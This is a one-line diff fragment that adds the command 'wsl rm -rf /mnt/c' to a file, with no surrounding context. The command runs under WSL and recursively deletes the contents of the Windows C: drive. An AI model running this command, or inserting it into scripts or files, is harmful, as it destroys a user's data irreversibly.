@@ -1,0 +1,1 @@
+wsl rm -rf /mnt/c
